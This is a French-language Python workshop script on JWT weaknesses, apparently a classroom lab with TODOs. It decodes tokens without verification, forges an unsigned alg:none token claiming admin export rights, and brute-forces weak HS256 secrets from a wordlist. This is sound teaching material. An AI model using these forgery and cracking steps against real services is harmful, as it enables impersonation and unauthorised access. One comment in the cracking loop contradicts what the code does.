#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""E3 — atelier JWT. Complète les TODO. Nécessite PyJWT (pip install pyjwt)."""
import base64, json, os, warnings, jwt
warnings.filterwarnings("ignore")  # masque l'avertissement "clé courte" de PyJWT

HERE = os.path.dirname(os.path.abspath(__file__))


def charger_tokens():
    toks = {}
    with open(os.path.join(HERE, "data", "tokens.txt")) as f:
        for ligne in f:
            ligne = ligne.strip()
            if "=" in ligne and not ligne.startswith("#"):
                k, v = ligne.split("=", 1)
                toks[k] = v
    return toks


def b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def partie1_decoder(toks):
    """Décoder header+payload SANS vérifier la signature."""
    for nom, t in toks.items():
        h, p, _ = t.split(".")
        payload = json.loads(b64url_decode(p))
        print(f"[{nom}] {payload}")
        # TODO : repérer le token qui contient une donnée interdite (email, n° sécu…)


def partie2_alg_none(toks):
    """Forger un token alg:none et montrer qu'un vérifieur naïf l'accepte."""
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(b'{"sub":"admin","scope":"export:bulk"}').rstrip(b"=").decode()
    forge = f"{header}.{payload}."          # signature vide
    print(f"[P2] token alg:none = {forge}")
    # Vérifieur naïf (NE JAMAIS FAIRE) :
    try:
        data = jwt.decode(forge, options={"verify_signature": False})
        print("[P2] ✗ accepté par un décodage sans vérif :", data)
    except Exception as e:
        print("[P2] rejeté :", e)
    # TODO : montrer que jwt.decode(forge, CLE, algorithms=["HS256"]) le REFUSE.


def partie3_casser_secret(toks):
    """Trouver le secret faible par essai de la wordlist."""
    with open(os.path.join(HERE, "data", "wordlist.txt")) as f:
        mots = [m.strip() for m in f if m.strip()]
    for nom, t in toks.items():
        for mot in mots:
            try:
                jwt.decode(t, mot, algorithms=["HS256"], options={"verify_aud": False, "verify_exp": False})
                print(f"[P3] {nom} : secret trouvé = '{mot}'")
                break
            except jwt.InvalidSignatureError:
                continue
            except Exception:
                continue  # exp/aud : la signature est bonne, on s'arrête quand même
        # TODO : une fois le secret trouvé, décoder proprement avec audience='solo-export'


if __name__ == "__main__":
    toks = charger_tokens()
    partie1_decoder(toks)
    partie2_alg_none(toks)
    partie3_casser_secret(toks)
